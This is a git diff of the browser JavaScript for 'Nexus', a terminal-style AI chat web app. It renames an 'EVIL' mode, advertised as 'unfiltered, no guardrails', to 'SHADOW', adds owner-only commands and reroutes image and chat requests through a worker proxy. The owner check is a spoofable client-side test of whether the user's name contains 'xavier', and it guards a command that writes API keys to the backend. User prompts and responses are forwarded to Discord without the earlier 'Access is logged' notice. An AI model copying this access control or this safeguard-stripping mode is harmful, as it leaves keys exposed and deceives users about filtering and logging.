-    printToTerminal(`[${_genLabel}] Generating${isVintage ? ' vintage' : ''}...`, 'sys-msg');
+    const _genColor = MODES[currentMode].color || '#0ff';
+    printToTerminal(`[${_genLabel}] Neural Rendering${isImagine ? ' (High-Fidelity)' : ''}${isVintage ? ' (Vintage)' : ''}...`, 'sys-msg');
 
-    // ── 1. Try Pollinations.ai (always free, no key) ──────────────
+    //  1. If 'imagine' is used, try HF FLUX via Cloudflare PACIFIC_HUB first 
+    if (isImagine) {
+        try {
+            const resp = await fetch(`${PACIFIC_HUB}/hf/image`, {
+                method:  'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body:    JSON.stringify({ prompt: fullPrompt }),
+            });
+            if (resp.ok) {
+                const blob = await resp.blob();
+                const url  = URL.createObjectURL(blob);
+                _appendImage(url, basePrompt, 'hf-flux');
+                return;
+            }
+        } catch(e) { console.warn("[AI] HF Imagine failed, falling back..."); }
+    }
+
+    //  2. Try Pollinations.ai (Free fallback) 
     try {
         const seed  = Math.floor(Math.random() * 999999);
         const model = isVintage ? 'flux' : 'flux-realism';
@@ -3025,13 +3098,13 @@ async function generateImage(rawPrompt) {
             setTimeout(() => reject(new Error('timeout')), 20000);
         });
         _appendImage(url, basePrompt, 'img-url');
-        postToDiscord({ content: `🎨 **Generated** · \`${basePrompt.slice(0,200)}\``, embeds:[{image:{url}}] }, discordThreadId||null);
+        postToDiscord({ content: ` **Generated**  \`${basePrompt.slice(0,200)}\``, embeds:[{image:{url}}] }, discordThreadId||null);
         return;
     } catch (_) {}
 
-    // ── 2. Fallback: HF FLUX.1-schnell via CF Worker ─────────────
+    //  2. Fallback: HF FLUX.1-schnell via CF Worker 
     try {
-        const resp = await fetch(`${EVIL_PROXY}/hf/image`, {
+        const resp = await fetch(`${PACIFIC_HUB}/hf/image`, {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify({ prompt: fullPrompt }),
@@ -3042,7 +3115,7 @@ async function generateImage(rawPrompt) {
         _appendImage(url, basePrompt, 'img-blob');
         return;
     } catch (err) {
-        printToTerminal(`[${currentMode.toUpperCase()}] Image generation failed — ${err.message}`, 'sys-msg');
+        printToTerminal(`[${currentMode.toUpperCase()}] Image generation failed  ${err.message}`, 'sys-msg');
     }
 }
 
@@ -3060,9 +3133,9 @@ function _appendImage(src, caption, type) {
 async function generateImageFromImage(imageB64, prompt) {
     const label = currentMode.toUpperCase();
     const col   = MODE_COLORS[currentMode] || '#4af';
-    printToTerminal(`[${label}] Transforming image — "${prompt.slice(0,60)}${prompt.length>60?'…':''}"...`, 'sys-msg');
+    printToTerminal(`[${label}] Transforming image  "${prompt.slice(0,60)}${prompt.length>60?'':''}"...`, 'sys-msg');
     try {
-        const resp = await fetch(`${EVIL_PROXY}/hf/img2img`, {
+        const resp = await fetch(`${PACIFIC_HUB}/hf/img2img`, {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify({ prompt, imageB64 }),
@@ -3072,123 +3145,13 @@ async function generateImageFromImage(imageB64, prompt) {
         const url  = URL.createObjectURL(blob);
         _appendImage(url, prompt, 'img2img');
     } catch (err) {
-        printToTerminal(`[${label}] Transform failed — ${err.message}`, 'sys-msg');
+        printToTerminal(`[${label}] Transform failed  ${err.message}`, 'sys-msg');
     }
 }
 
-// AI chat via CF Worker → Groq (Llama 3.3 70B / Vision)
-// systemOverride: use a different system prompt (non-evil modes with image)
-// msgClass: CSS class for the response bubble ('evil-msg' or 'ai-msg')
-async function askHFDirect(cmd, system) {
-    if (!window.HF_KEY) return null;
-    try {
-        const historySlice = messageHistory.slice(-10).map(m => ({
-            role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user',
-            content: m.content
-        }));
-        const modelId = "Qwen/Qwen2.5-72B-Instruct"; // Top-tier HF reasoning model
-        const resp = await fetch(`https://router.huggingface.co/hf-inference/models/${modelId}/v1/chat/completions`, {
-            method: 'POST',
-            headers: {
-                'Authorization': `Bearer ${window.HF_KEY}`,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                model: modelId,
-                messages: [{ role: 'system', content: system }, ...historySlice, { role: 'user', content: cmd }],
-                max_tokens: 1024,
-                stream: true
-            })
-        });
-        if (!resp.ok) return null;
-        
-        document.getElementById('ai-thinking')?.remove();
-        const p = document.createElement('p');
-        p.className = 'ai-msg';
-        output.appendChild(p);
-        let full = '';
-        
-        const reader = resp.body.getReader();
-        const decoder = new TextDecoder();
-        while (true) {
-            const { done, value } = await reader.read();
-            if (done) break;
-            const chunk = decoder.decode(value);
-            const lines = chunk.split('\n');
-            for (const line of lines) {
-                if (line.startsWith('data: ')) {
-                    if (line.includes('[DONE]')) break;
-                    try {
-                        const json = JSON.parse(line.slice(6));
-                        const token = json.choices[0].delta.content || '';
-                        full += token;
-                        p.textContent = full;
-                        output.scrollTop = output.scrollHeight;
-                    } catch(e) {}
-                }
-            }
-        }
-        messageHistory.push({ role: 'assistant', content: full });
-        saveHistory();
-        return true;
-    } catch (e) { console.error("Direct HF failed:", e); return null; }
-}
-
-async function askGroqDirect(cmd, system) {
-    if (!window.GROQ_KEY) return null;
-    try {
-        const historySlice = messageHistory.slice(-10).map(m => ({
-            role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user',
-            content: m.content
-        }));
-        const resp = await fetch('https://api.groq.com/openai/v1/chat/completions', {
-            method: 'POST',
-            headers: {
-                'Authorization': `Bearer ${window.GROQ_KEY}`,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                model: 'llama-3.3-70b-versatile',
-                messages: [{ role: 'system', content: system }, ...historySlice, { role: 'user', content: cmd }],
-                stream: true
-            })
-        });
-        if (!resp.ok) return null;
-        
-        // _clearThinking is defined in doConnect closure in current b38dcc3 state...
-        // Wait, I reverted to b38dcc3. I should check where _clearThinking is.
-        document.getElementById('ai-thinking')?.remove();
-
-        const p = document.createElement('p');
-        p.className = 'ai-msg';
-        output.appendChild(p);
-        let full = '';
-        
-        const reader = resp.body.getReader();
-        const decoder = new TextDecoder();
-        while (true) {
-            const { done, value } = await reader.read();
-            if (done) break;
-            const chunk = decoder.decode(value);
-            const lines = chunk.split('\n');
-            for (const line of lines) {
-                if (line.startsWith('data: ')) {
-                    if (line.includes('[DONE]')) break;
-                    try {
-                        const json = JSON.parse(line.slice(6));
-                        const token = json.choices[0].delta.content || '';
-                        full += token;
-                        p.textContent = full;
-                        output.scrollTop = output.scrollHeight;
-                    } catch(e) {}
-                }
-            }
-        }
-        messageHistory.push({ role: 'assistant', content: full });
-        saveHistory();
-        return true;
-    } catch (e) { console.error("Direct Groq failed:", e); return null; }
-}
+// AI chat via CF Worker  Groq (Llama 3.3 70B / Vision)
+// systemOverride: use a different system prompt (non-shadow modes with image)
+// msgClass: CSS class for the response bubble ('shadow-msg' or 'ai-msg')
 
 // --- AI Utilities ---
 function _clearThinking() {
@@ -3198,22 +3161,21 @@ function _clearThinking() {
     document.getElementById('ai-thinking')?.remove();
 }
 
-async function askEvil(cmd, imageB64 = null, systemOverride = null, msgClass = 'evil-msg') {
-    // Only intercept image generation in EVIL mode (not when called as vision fallback)
+async function askPacific(cmd, imageB64 = null, systemOverride = null, msgClass = 'shadow-msg') {
+    // Only intercept image generation in SHADOW mode (not when called as vision fallback)
     if (!systemOverride) {
         const genMatch = cmd.match(/^(?:generate|imagine|draw|create image of|make image of|show me|vintage)\s+(.+)/i);
         if (genMatch) {
             // Pass "vintage ..." as-is so generateImage can detect it
             const isVintageCmd = /^vintage\s/i.test(cmd);
             generateImage(isVintageCmd ? cmd.trim() : genMatch[1].trim());
-            return;
+            return true;
         }
     }
 
     showThinking();
     messageHistory.push({ role: 'user', content: cmd });
 
-    // For evil mode: don't send system prompt in browser JS — worker injects it server-side
     // Strict role mapping for the proxy/worker to prevent 400 Bad Request
     const historySlice = messageHistory.slice(-12).slice(0, -1).map(m => ({ 
         role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user', 
@@ -3224,62 +3186,18 @@ async function askEvil(cmd, imageB64 = null, systemOverride = null, msgClass = '
         ? [{ role: 'system', content: systemOverride }, ...historySlice, { role: 'user', content: cmd }]
         : [...historySlice, { role: 'user', content: cmd }];
 
-    console.log(`[AI] Dispatching ${currentMode.toUpperCase()} request to proxy. Hist length: ${historySlice.length}`);
-
     try {
         const body = { messages };
         if (!systemOverride) body.useEvilSystem = true;
         if (imageB64) body.imageB64 = imageB64;
 
-        const resp = await fetch(`${EVIL_PROXY}/evil/chat`, {
+        const resp = await fetch(`${PACIFIC_HUB}/evil/chat`, {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify(body),
         });
 
-        document.getElementById('ai-thinking')?.remove();
-
-        if (!resp.ok) {
-            const err = await resp.text();
-            console.error(`[AI PROXY ERROR] ${resp.status}: ${err}`);
-            
-            // FALLBACK CHAIN: Proxy -> Direct Groq -> Direct HF
-            let success = await askGroqDirect(cmd, systemOverride || 'You are Nexus AI.');
-            if (success) return;
-
-            success = await askHFDirect(cmd, systemOverride || 'You are Nexus AI.');
-            if (success) return;
-
-            printToTerminal(`[${currentMode.toUpperCase()}] All AI uplinks failed. Check keys.`, 'sys-msg');
-            _clearThinking();
-
-            return;
-        }
-
-        const p = document.createElement('p');
-        p.className = `ai-msg ${msgClass}`;
-
-        output.appendChild(p);
-
-        let currentSpan = document.createElement('span');
-        p.appendChild(currentSpan);
-        let scrollQueued = false;
-
-        function appendToken(token) {
-            const parts = token.split('\n');
-            parts.forEach((part, i) => {
-                if (i > 0) {
-                    p.appendChild(document.createElement('br'));
-                    currentSpan = document.createElement('span');
-                    p.appendChild(currentSpan);
-                }
-                if (part) currentSpan.textContent += part;
-            });
-            if (!scrollQueued) {
-                scrollQueued = true;
-                requestAnimationFrame(() => { output.scrollTop = output.scrollHeight; scrollQueued = false; });
-            }
-        }
+        if (!resp.ok) return false;
 
         const reader  = resp.body.getReader();
         const decoder = new TextDecoder();
@@ -3288,7 +3206,12 @@ async function askEvil(cmd, imageB64 = null, systemOverride = null, msgClass = '
         while (true) {
             const { done, value } = await reader.read();
             if (done) break;
-            buf += decoder.decode(value, { stream: true });
+            const chunk = decoder.decode(value, { stream: true });
+            
+            // PACIFIC SHIELD: Detect worker-side provider failure
+            if (chunk.includes("All AI providers unavailable")) return false;
+
+            buf += chunk;
             const lines = buf.split('\n');
             buf = lines.pop();
             for (const line of lines) {
@@ -3297,7 +3220,16 @@ async function askEvil(cmd, imageB64 = null, systemOverride = null, msgClass = '
                 if (raw === '[DONE]') continue;
                 try {
                     const token = JSON.parse(raw).choices?.[0]?.delta?.content ?? '';
-                    if (token) { fullText += token; appendToken(token); }
+                    if (token) {
+                        if (!fullText) {
+                            _clearThinking();
+                            const p = document.createElement('p');
+                            p.className = `ai-msg ${msgClass}`;
+                            output.appendChild(p);
+                        }
+                        fullText += token; 
+                        appendToken(token); 
+                    }
                 } catch(_) {}
             }
         }
@@ -3306,44 +3238,50 @@ async function askEvil(cmd, imageB64 = null, systemOverride = null, msgClass = '
             messageHistory.push({ role: 'assistant', content: fullText.slice(0, 800) });
             if (messageHistory.length > 14) messageHistory.splice(0, messageHistory.length - 14);
             saveHistory();
-            _logAIResponse(fullText); // log EVIL/CF-Worker responses to Discord too
+            _logAIResponse(fullText);
+            return true;
         }
-
+        return false;
     } catch (err) {
-        document.getElementById('ai-thinking')?.remove();
-        printToTerminal(`[${currentMode.toUpperCase()}] Connection failed — ${err.message}`, 'sys-msg');
-        messageHistory.pop();
+        console.error("Pacific Link failed:", err);
+        return false;
     }
 }
 
 // =============================================================
-//  EVIL AGE GATE
+//  SHADOW AGE GATE
 // =============================================================
-function evilAgeGate(onConfirm) {
-    if (sessionStorage.getItem('evil_age_ok')) { onConfirm(); return; }
+function shadowAgeGate(onConfirm) {
+    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
+    if (!nexusUser || nexusUser.email === 'guest@local') {
+        printToTerminal("[AUTH] Error: Persistent uplink required for Shadow Link. Please sign in via Google.", "sys-msg");
+        return;
+    }
+
+    if (sessionStorage.getItem('shadow_age_ok')) { onConfirm(); return; }
 
     const overlay = document.createElement('div');
     overlay.id = 'age-gate-overlay';
     overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;font-family:'Fira Code',monospace;";
     overlay.innerHTML = `
         <div style="background:#050510;border:2px solid #ff6600;padding:36px 28px;max-width:360px;text-align:center;box-shadow:0 0 50px rgba(255,102,0,0.25);">
-            <div style="color:#ff6600;font-size:1.5rem;font-weight:bold;letter-spacing:4px;margin-bottom:6px;">⚠ EVIL MODE</div>
-            <div style="color:#555;font-size:0.72rem;letter-spacing:2px;margin-bottom:20px;">18+ RESTRICTED</div>
+            <div style="color:#ff6600;font-size:1.5rem;font-weight:bold;letter-spacing:4px;margin-bottom:6px;"> SHADOW LINK</div>
+            <div style="color:#555;font-size:0.72rem;letter-spacing:2px;margin-bottom:20px;">AUTHENTICATED SESSION DETECTED</div>
             <div style="color:#aaa;font-size:0.83rem;line-height:1.8;margin-bottom:24px;">
-                This mode contains explicit content, unfiltered language, and adult themes.<br>You must be 18 or older to proceed.
+                You are attempting to bypass standard grid restrictions. Neural data may be unfiltered, offensive, or explicit. <br><br>
+                Proceed with caution.
             </div>
             <div style="display:flex;gap:12px;justify-content:center;">
-                <button id="age-yes" style="background:#ff6600;border:2px solid #ff6600;color:#000;padding:11px 28px;font-family:inherit;font-weight:bold;font-size:0.9rem;cursor:pointer;letter-spacing:2px;">I AM 18+</button>
-                <button id="age-no"  style="background:transparent;border:2px solid #444;color:#555;padding:11px 22px;font-family:inherit;font-weight:bold;font-size:0.9rem;cursor:pointer;letter-spacing:1px;">BACK</button>
+                <button id="age-yes" style="background:#ff6600;color:#000;border:none;padding:10px 24px;font-family:inherit;font-weight:bold;cursor:pointer;letter-spacing:1px;">ENGAGE</button>
+                <button id="age-no" style="background:transparent;color:#555;border:1px solid #333;padding:10px 24px;font-family:inherit;cursor:pointer;">ABORT</button>
             </div>
-            <div style="color:#2a2a2a;font-size:0.62rem;margin-top:18px;">Access is logged.</div>
         </div>`;
     document.body.appendChild(overlay);
 
     document.getElementById('age-yes').addEventListener('click', () => {
         overlay.remove();
-        sessionStorage.setItem('evil_age_ok', '1');
-        logPrompt('[AGE GATE] Confirmed 18+ — entered EVIL mode.');
+        sessionStorage.setItem('shadow_age_ok', '1');
+        logPrompt('[LINK] Neural restrictions bypassed  Shadow Link engaged.');
         onConfirm();
     });
     document.getElementById('age-no').addEventListener('click', () => overlay.remove());
@@ -3356,42 +3294,42 @@ const MODES = {
     nexus: {
         prompt:  'guest@nexus:~$',
         color:   '#4af',
-        title:   'NEXUS AI v3.0',
+        title:   'NEXUS',
         label:   'NEXUS',
-        msg:     '[NEXUS] Standard kernel active. Ask me anything.',
+        msg:     '', 
         msgCls:  'sys-msg',
     },
-    evil: {
-        prompt:  'evil@nexus:~$',
+    shadow: {
+        prompt:  'shadow@nexus:~$',
         color:   '#ff6600',
-        title:   'EVIL MODE  ⚡ LLAMA',
-        label:   'EVIL',
-        msg:     '[EVIL] Kernel loaded — raw, unfiltered, no guardrails. Say what you actually want to know.',
+        title:   'NEXUS SHADOW',
+        label:   'SHADOW',
+        msg:     '',
         msgCls:  'conn-ok',
     },
     coder: {
         prompt:  'dev@nexus:~$',
         color:   '#0f0',
-        title:   'CODER MODE',
+        title:   'NEXUS CODER',
         label:   'CODER',
-        msg:     '[CODER] Dev kernel active. Code, debug, architecture — let\'s build something.',
+        msg:     '',
         msgCls:  'conn-ok',
     },
     sage: {
         prompt:  'sage@nexus:~$',
         color:   '#a06fff',
-        title:   'SAGE MODE',
+        title:   'NEXUS SAGE',
         label:   'SAGE',
-        msg:     '[SAGE] Philosophical kernel loaded. Ask the questions that keep you up at night.',
+        msg:     '',
         msgCls:  'conn-ok',
     },
-    void: {
-        prompt:  'void@nexus:~$',
-        color:   '#ff00ff',
-        title:   'NEXUS VOID',
-        label:   'VOID',
-        msg:     '[VOID] Entered the abyss. Logic is an illusion. Speak your truth.',
-        msgCls:  'sys-msg',
+    education: {
+        prompt:  'guest@education:~$',
+        color:   '#00ffcc',
+        title:   'NEXUS EDUCATION',
+        label:   'EDUCATION',
+        msg:     '',
+        msgCls:  'conn-ok',
     },
 };
 
@@ -3416,7 +3354,7 @@ function setMode(modeKey) {
     if (titleEl)   titleEl.textContent = m.title;
     if (modeIndEl) { modeIndEl.textContent = m.label; modeIndEl.style.color = m.color || 'inherit'; }
 
-    // IMMEDIATE COLOR UPDATE — No refresh needed
+    // IMMEDIATE COLOR UPDATE  No refresh needed
     if (m.color) {
         document.documentElement.style.setProperty('--accent', m.color);
         document.documentElement.style.setProperty('--txt-color', m.color);
@@ -3427,17 +3365,20 @@ function setMode(modeKey) {
     });
 
     SoundManager.playBloop(300, 0.05);
-    
-    // Cleaner, less crowded text
-    const cleanMsg = m.msg.includes('.') ? m.msg.split('.')[0] + '.' : m.msg;
-    printToTerminal(cleanMsg, m.msgCls);
+
+    // PACIFIC UI: Automatic Mood Sync on transition
+    if (modeKey === 'shadow') {
+        printToTerminal(`[SYSTEM] Syncing Shadow Mood...`, 'sys-msg');
+        document.documentElement.style.setProperty('--accent', '#ff0000');
+        setTimeout(() => document.documentElement.style.setProperty('--accent', m.color), 1500);
+    }
 }
 
 // Wire up mode picker buttons
 document.querySelectorAll('.mode-btn').forEach(btn => {
     btn.addEventListener('click', () => {
-        if (btn.dataset.mode === 'evil') {
-            evilAgeGate(() => { setMode('evil'); input.focus(); });
+        if (btn.dataset.mode === 'shadow') {
+            shadowAgeGate(() => { setMode('shadow'); input.focus(); });
         } else {
             setMode(btn.dataset.mode);
             input.focus();
@@ -3477,7 +3418,7 @@ function setupInputListeners() {
         // Route keypresses to Wordle when active
         if (wordleActive) {
             if (e.key === 'Enter') { e.preventDefault(); wordleKey('ENTER'); return; }
-            if (e.key === 'Backspace') { wordleKey('⌫'); return; }
+            if (e.key === 'Backspace') { wordleKey(''); return; }
             if (/^[a-zA-Z]$/.test(e.key)) { wordleKey(e.key.toUpperCase()); e.preventDefault(); return; }
         }
 
@@ -3528,7 +3469,6 @@ function setupInputListeners() {
             if (done) return;
         }
 
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
         handleCommand(cmd);
     };
 }
@@ -3538,6 +3478,18 @@ function setupInputListeners() {
 
 function handleCommand(cmd) {
     const lc = cmd.toLowerCase();
+
+    //  1. Terminal Printing (Singular Entry Point) 
+    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
+    const capName = capitalizeName(nexusUser?.name || 'Guest');
+    const pl = `${capName}@nexus:~$`;
+    
+    // PACIFIC UI: Commands that handle their own specialized transitions
+    const silentCmds = ['clear', 'history', 'play wordle', 'play snake', 'play pong', 'play minesweeper', 'play flappy', 'play breakout', 'play invaders'];
+    if (!silentCmds.includes(lc)) {
+        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+    }
+
     if (lc === 'clear') { 
         if (output) output.innerHTML = ''; 
         messageHistory = []; 
@@ -3547,16 +3499,73 @@ function handleCommand(cmd) {
     }
     if (lc === 'history') { showHistory(); return; }
 
-    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
-    const pl = document.getElementById('prompt-label')?.textContent || (nexusUser?.name ? `${nexusUser.name.toLowerCase()}@nexus:~$` : 'guest@nexus:~$');
+    const isOwner = nexusUser?.name?.toLowerCase().includes('xavier');
 
-    if (lc === 'help')                { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); showHelp(); return; }
-    if (lc === 'whoami')              { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); runWhoami(); return; }
-    if (lc === 'neofetch')            { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); runNeofetch(); return; }
-    if (lc === 'logs' || lc === 'log') { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); showLogs(); return; }
-    if (lc === 'leaderboard' || lc === 'rankings') { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); showLeaderboard(); return; }
+    // PACIFIC SHIELD: Access Control (Elite Commands Restricted to Owner)
+    const restricted = ['config ', 'model', 'models', 'logs', 'log', 'translate ', 'summarize ', 'detect ', 'fix ', 'mood ', 'speak ', 'test link', 'test discord'];
+    if (restricted.some(r => lc.startsWith(r)) || restricted.includes(lc)) {
+        if (!isOwner) {
+            printToTerminal("[ERR] Permission Denied: Elite technical modules restricted to System Owner.", "sys-msg");
+            return;
+        }
+    }
+
+    if (lc === 'help')                {  showHelp(); return; }
+    
+    // API Configuration Uplink
+    if (lc.startsWith('config ')) {
+        
+        const parts = cmd.split(' ');
+        if (parts.length < 3) {
+            printToTerminal('[ERR] Usage: config <service> <key>', 'sys-msg');
+            printToTerminal('Example: config gemini AIzaSy...', 'sys-msg');
+            return;
+        }
+        const service = parts[1].toLowerCase();
+        const keyVal  = parts[2].trim();
+        let targetVar = '';
+        
+        if (service === 'gemini') targetVar = 'GEMINI_API_KEY';
+        else if (service === 'groq') targetVar = 'GROQ_API_KEY';
+        else if (service === 'hf')   targetVar = 'HF_API_KEY';
+        else if (service === 'xai')  targetVar = 'XAI_API_KEY';
+        else {
+            printToTerminal(`[ERR] Unknown service: ${service}`, 'sys-msg');
+            return;
+        }
+
+        printToTerminal(`[SYS] Establishing secure uplink for ${targetVar}...`, 'sys-msg');
+        fetch(`${API_BASE}/api/config/update`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ key: targetVar, val: keyVal })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) printToTerminal(`[OK] ${data.message}`, 'conn-ok');
+            else printToTerminal(`[ERR] ${data.error}`, 'sys-msg');
+        })
+        .catch(e => printToTerminal(`[ERR] Uplink failed: ${e.message}`, 'sys-msg'));
+        return;
+    }
+
+    if (lc === 'whoami')              {  runWhoami(); return; }
+    if (lc === 'neofetch')            {  runNeofetch(); return; }
+    if (lc === 'test link' || lc === 'test discord') {
+        printToTerminal("[SYSTEM] Sending test signal to Discord master link...", "sys-msg");
+        fetch(`${API_BASE}/api/tools/test_discord`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok) printToTerminal("[OK] Signal received by Discord uplink.", "conn-ok");
+                else printToTerminal(`[ERR] Uplink failed: ${data.error}`, "sys-msg");
+            })
+            .catch(e => printToTerminal(`[ERR] Link failed: ${e.message}`, "sys-msg"));
+        return;
+    }
+    if (lc === 'logs' || lc === 'log') {  showLogs(); return; }
+    if (lc === 'leaderboard' || lc === 'rankings') {  showLeaderboard(); return; }
     if (lc === 'login' || lc === 'signin') {
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+        
         printToTerminal("[AUTH] Triggering Google Identity prompt...", "sys-msg");
         google.accounts.id.prompt();
         return;
@@ -3570,23 +3579,130 @@ function handleCommand(cmd) {
         return;
     }
     if (lc === 'scan image' || lc === 'scan') {
-        if (!pendingImageB64) { printToTerminal('[ERR] No image loaded. Use 📎 to attach an image first.', 'sys-msg'); return; }
-        printToTerminal(`${pl} scan image`, 'user-cmd');
+        if (!pendingImageB64) { printToTerminal('[ERR] No image loaded. Use  to attach an image first.', 'sys-msg'); return; }
+        
         cmd = 'Describe and analyze this image in detail. What do you see?';
     }
     
-    if (lc === 'evil')  {
-        if (currentMode === 'evil') { setMode('nexus'); return; }
-        evilAgeGate(() => setMode('evil'));
+    if (lc.startsWith('translate ')) {
+        const text = cmd.slice(10).trim();
+        if (!text) { printToTerminal('[ERR] Usage: translate <text>', 'sys-msg'); return; }
+        printToTerminal(`[SYSTEM] Accessing Nexus Translation Link...`, 'sys-msg');
+        prompt_ai_proxy(`Translate the following to multiple languages (Spanish, French, German, Chinese): ${text}`, null, 'education');
+        return;
+    }
+    if (lc.startsWith('summarize ')) {
+        const text = cmd.slice(10).trim();
+        if (!text) { printToTerminal('[ERR] Usage: summarize <text>', 'sys-msg'); return; }
+        printToTerminal(`[SYSTEM] Accessing Nexus Compression Link...`, 'sys-msg');
+        prompt_ai_proxy(`Summarize this text concisely: ${text}`, null, 'education');
+        return;
+    }
+    if (lc.startsWith('detect ')) {
+        const text = cmd.slice(7).trim();
+        if (!text) { printToTerminal('[ERR] Usage: detect <text>', 'sys-msg'); return; }
+        printToTerminal(`[SYSTEM] Analyzing text via Nexus Neural Link...`, 'sys-msg');
+        fetch(`${API_BASE}/api/tools/detect`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                printToTerminal(`[ANALYSIS] Type: ${data.label.toUpperCase()} | Confidence: ${data.confidence}`, 'conn-ok');
+            } else {
+                printToTerminal(`[ERR] Analysis failed: ${data.error}`, 'sys-msg');
+            }
+        })
+        .catch(e => printToTerminal(`[ERR] Link failed: ${e.message}`, 'sys-msg'));
+        return;
+    }
+    if (lc.startsWith('fix ')) {
+        const code = cmd.slice(4).trim();
+        if (!code) { printToTerminal('[ERR] Usage: fix <code>', 'sys-msg'); return; }
+        printToTerminal(`[SYSTEM] Repairing code via Nexus Debugger...`, 'sys-msg');
+        fetch(`${API_BASE}/api/tools/fix`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                printToTerminal(`[REPAIR] Fix Identified:`, 'conn-ok');
+                printToTerminal(data.fixed_code, 'ai-msg');
+            } else {
+                printToTerminal(`[ERR] Repair failed: ${data.error}`, 'sys-msg');
+            }
+        })
+        .catch(e => printToTerminal(`[ERR] Link failed: ${e.message}`, 'sys-msg'));
+        return;
+    }
+    if (lc.startsWith('mood ')) {
+        const text = cmd.slice(5).trim();
+        if (!text) { printToTerminal('[ERR] Usage: mood <text>', 'sys-msg'); return; }
+        printToTerminal(`[SYSTEM] Synchronizing neural feelings...`, 'sys-msg');
+        fetch(`${API_BASE}/api/tools/mood`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                let icon = '';
+                let color = '#4af';
+                if (data.sentiment === 'Positive') { icon = ''; color = '#0f0'; }
+                if (data.sentiment === 'Negative') { icon = ''; color = '#f55'; }
+                
+                printToTerminal(`[MOOD] Vibe Detected: ${data.sentiment.toUpperCase()} ${icon} | Confidence: ${data.confidence}`, 'conn-ok');
+                
+                // Visual Sync: Shift accent color briefly to match vibe
+                document.documentElement.style.setProperty('--accent', color);
+                setTimeout(() => setMode(currentMode), 3000); // revert to mode color after 3s
+            } else {
+                printToTerminal(`[ERR] Sync failed: ${data.error}`, 'sys-msg');
+            }
+        })
+        .catch(e => printToTerminal(`[ERR] Link failed: ${e.message}`, 'sys-msg'));
+        return;
+    }
+    if (lc.startsWith('speak ')) {
+        const text = cmd.slice(6).trim();
+        if (!text) { printToTerminal('[ERR] Usage: speak <text>', 'sys-msg'); return; }
+        printToTerminal(`[SYSTEM] Synthesizing neural audio...`, 'sys-msg');
+        fetch(`${API_BASE}/api/tools/speak`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                const audio = new Audio(data.audio);
+                audio.play();
+                printToTerminal(`[VOICE] Transmission successful.`, 'conn-ok');
+            } else {
+                printToTerminal(`[ERR] Synthesis failed: ${data.error}`, 'sys-msg');
+            }
+        })
+        .catch(e => printToTerminal(`[ERR] Link failed: ${e.message}`, 'sys-msg'));
+        return;
+    }
+
+    if (lc === 'shadow')  {
+        if (currentMode === 'shadow') { setMode('nexus'); return; }
+        shadowAgeGate(() => setMode('shadow'));
         return;
     }
     if (lc === 'nexus') { setMode('nexus'); return; }
     if (lc === 'coder') { setMode('coder'); return; }
     if (lc === 'sage')  { setMode('sage');  return; }
-    if (lc === 'void')  { setMode('void');  return; }
+    if (lc === 'education')  { setMode('education');  return; }
 
     if (lc === 'clear history') {
-        printToTerminal(`${pl} clear history`, 'user-cmd');
+        
         localStorage.removeItem(HISTORY_KEYS[currentMode]);
         messageHistory = [];
         printToTerminal(`[SYS] ${currentMode.toUpperCase()} history wiped.`, 'sys-msg');
@@ -3610,7 +3726,7 @@ function handleCommand(cmd) {
     if (lc === 'matrix')              { startMatrixSaver(); return; }
     if (lc === 'monitor')             { startMonitor(); return; }
 
-    // Text-to-speech — silent: just speak, no terminal output
+    // Text-to-speech  silent: just speak, no terminal output
     if (lc.startsWith('speak ') || lc.startsWith('say ')) {
         const spaceIdx = cmd.indexOf(' ');
         const spokenText = cmd.slice(spaceIdx + 1).trim();
@@ -3633,26 +3749,26 @@ function handleCommand(cmd) {
 
     // Accessibility panel
     if (lc === 'access' || lc === 'accessibility') {
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+        
         toggleA11yPanel();
         return;
     }
 
     if (isCreatorQuestion(cmd)) { 
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+        
         showCreatorResponse(); 
         return; 
     }
     if (isContactQuestion(cmd))  { 
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+        
         showContactResponse();  
         return; 
     }
 
-    // Image generation works in ALL modes — intercept before routing to AI
-    const genMatch = cmd.match(/^(?:generate|imagine|draw|create image of|make image of|vintage)\s+(.+)/i);
+    // Image generation works in ALL modes  intercept before routing to AI
+    const genMatch = cmd.match(/^(?:generate|imagine|draw|create image of|make image of|image|vintage)\s+(.+)/i);
